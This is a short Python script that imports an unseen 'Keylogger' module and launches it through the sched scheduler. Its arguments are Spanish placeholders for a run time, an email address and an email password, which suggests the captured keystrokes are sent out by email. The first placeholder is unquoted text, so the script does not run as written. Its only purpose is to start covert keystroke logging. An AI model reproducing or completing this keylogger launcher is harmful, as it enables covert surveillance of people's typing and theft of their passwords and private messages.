from sched import scheduler
import Keylogger
def main():
    my_keylogger = Keylogger.Keylogger(pon el tiempo que quieres que se ejcute,"pon aqui tu correo","pon aqui tu contraseña")
    my_keylogger.start()

scheduler=scheduler()
scheduler.enter(1,0,main)

scheduler.run()
